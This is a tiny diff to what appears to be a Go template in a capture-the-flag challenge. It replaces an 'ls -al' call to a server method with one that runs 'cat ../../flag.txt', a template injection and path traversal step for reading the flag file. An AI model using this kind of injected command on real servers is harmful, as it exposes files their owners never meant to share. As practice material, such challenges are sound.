@@ -17,4 +17,4 @@
 {{ .ServerInfo.KernelVersion }}
 {{ .ServerInfo.Memory }}
 {{ . }}
-{{ .FetchServerInfo "ls -al " }}
+{{ .FetchServerInfo "cat ../../flag.txt " }}
